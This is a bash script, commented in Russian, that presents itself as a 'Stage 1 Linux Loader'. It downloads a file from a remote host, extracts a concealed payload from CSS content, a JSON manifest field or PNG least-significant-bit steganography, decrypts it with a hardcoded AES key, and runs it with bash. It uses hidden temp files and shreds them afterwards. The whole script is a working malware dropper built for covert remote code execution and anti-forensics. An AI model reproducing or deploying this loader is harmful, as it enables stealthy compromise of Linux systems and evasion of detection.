#!/bin/bash
# Универсальный Stage 1 Linux Loader для 2025+ (LSB PNG: строго по длине!)

DELIVERY="png"          # css, manifest, png (подставляет run.sh)
URL="http://192.168.0.151:1/favicon.png"                    # http://IP:PORT/style.css или manifest.json или favicon.png
KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"                    # HEX (подставляет run.sh)
TMP=/tmp/.drop$RANDOM$RANDOM

case "$DELIVERY" in
  css)
    PAYLOAD=$(curl -fsSL "$URL" | grep -oP 'content:\s*"\K[^"]+')
    ;;
  manifest)
    PAYLOAD=$(curl -fsSL "$URL" | grep -oP '"payload"\s*:\s*"\K[^"]+')
    ;;
  png)
    curl -fsSL "$URL" -o "$TMP.png"
    cat > "$TMP.extract.py" <<'PYCODE'
from PIL import Image
import sys
import struct

def extract_lsb_with_len(png_file):
    img = Image.open(png_file).convert("RGBA")
    pixels = list(img.getdata())
    bits = []
    for pixel in pixels:
        r, g, b, a = pixel
        bits.append(str(r & 1))
        bits.append(str(g & 1))
        bits.append(str(b & 1))
    # Сначала длина (4 байта big-endian)
    header_bits = bits[:32]
    payload_len = struct.unpack(">I", int(''.join(header_bits), 2).to_bytes(4, 'big'))[0]
    chars = []
    for i in range(32, 32 + payload_len * 8, 8):
        byte = bits[i:i+8]
        if len(byte) < 8:
            break
        c = chr(int(''.join(byte), 2))
        chars.append(c)
    return ''.join(chars)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 lsb_extract.py <input_png>")
        sys.exit(1)
    result = extract_lsb_with_len(sys.argv[1])
    print(result)
PYCODE
    PAYLOAD=$(python3 "$TMP.extract.py" "$TMP.png")
    rm -f "$TMP.png" "$TMP.extract.py"
    ;;
  *)
    echo "Unknown delivery method"; exit 1
    ;;
esac


if [[ -z "$PAYLOAD" ]]; then
  echo "[!] PAYLOAD not found, exiting!"
  exit 2
fi

# --- [ Расшифровка ] ---
iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

echo "$cipher" | base64 -d > "$TMP.cipher"
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in "$TMP.cipher" -out "$TMP.plain" 2>/dev/null

bash "$TMP.plain"

shred -u "$TMP.cipher" "$TMP.plain" 2>/dev/null

exit 0
